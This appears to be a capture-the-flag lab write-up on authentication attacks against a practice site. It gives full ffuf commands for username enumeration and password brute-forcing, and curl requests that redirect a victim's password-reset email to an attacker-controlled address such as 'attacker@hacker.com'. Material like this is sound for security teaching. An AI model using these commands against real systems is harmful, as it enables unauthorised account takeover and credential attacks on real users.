# Website Error Messages for Username Enumeration

Website error messages can be valuable resources for gathering information to build a list of valid usernames. For instance, on the Acme IT Support website’s signup page (http://MACHINE_IP/customers/signup), there’s a form to create a new user account.

If you try entering the username 'admin' and fill in the other fields with fake data, you'll receive an error: 'An account with this username already exists.' This error message can be leveraged to compile a list of valid usernames already registered in the system, using a tool like ffuf.

Username Enumeration with ffuf

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```

In this example:

The -w flag specifies the location of the username wordlist on the system.

The -X flag sets the request method. By default, it's a GET request, but in our case, it’s a POST request.

The -d flag indicates the data being sent. Here, we have fields for username, email, password, and cpassword, with the username value set to FUZZ. The keyword FUZZ is used by ffuf to replace it with values from our wordlist in the request.

The -H flag is used to add additional headers to the request; in this instance, we set the Content-Type so the server recognizes it as form data.

The -u flag specifies the URL endpoint for the request.

Finally, the -mr flag looks for a specific response text (‘username already exists’) to confirm if a valid username is found.

# Brute Force

A brute force attack is an automated method that tests a list of commonly used passwords against either a single username or, as in our case, a list of usernames.

When executing this command, make sure your terminal is in the same directory as the valid_usernames.txt file.

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```

This ffuf command is slightly different from the one used in Task 2. 

Previously, we used the FUZZ keyword to specify where in the request the data from the wordlists should be inserted. However, because we are using multiple wordlists here, we define our own placeholders. 

In this case:

- W1 represents our list of valid usernames.
- W2 represents the list of passwords we want to test.
- The multiple wordlists are indicated using the -w flag, separated by a comma. To determine a successful match, the -fc flag is used to filter for - HTTP status codes other than 200.

Executing this command will identify a working username and password combination that can be used to answer the question below.

# Logic Flaw

Sometimes, authentication processes contain logic flaws. A logic flaw occurs when the usual logical flow of an application is bypassed, manipulated, or circumvented by an attacker. 

These flaws can exist anywhere on a website, but here, we'll focus on examples related to authentication.

## Logic Flaw Example

Below is a mock code snippet that checks if the URL path begins with /admin. If it does, it performs an additional check to verify if the user is an admin. Otherwise, it displays the page:

```
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```
In this example, the code uses === to check for an exact match, including case sensitivity. This presents a logic flaw because an unauthenticated user accessing /adMin will bypass the check and view the page, effectively bypassing the authentication process.

## Logic Flaw Practical

We will explore the Reset Password function on the Acme IT Support site (http://MACHINE_IP/customers/reset). The form requests an email associated with the account. If an invalid email is entered, the message "Account not found from supplied email address" appears.

For this example, using robert@acmeitsupport.thm as the email address will be accepted. The form then asks for the username associated with this email. Entering robert will confirm that a password reset email will be sent to robert@acmeitsupport.thm.

You may wonder about the vulnerability since both the email and username are required. However, let's illustrate how this can be exploited using curl requests.

 ```
 curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

The -H flag sets the header to inform the server that form data is being sent.
The server retrieves the account using the query string, but when sending the reset email, it uses the PHP variable $_REQUEST, which combines query string and POST data.

Exploit Using Curl :

By adding another parameter to the POST data, we can control the recipient of the password reset email:

```
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

To proceed, create an account on the Acme IT support site, which provides you with a unique email address ({username}@customer.acmeitsupport.thm).

Run Curl Request 2 again, replacing the email with your own Acme IT email:

```
curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```

This will create a support ticket with a link allowing you to log in as Robert. Using Robert’s account, you can access his support tickets and find the flag.

















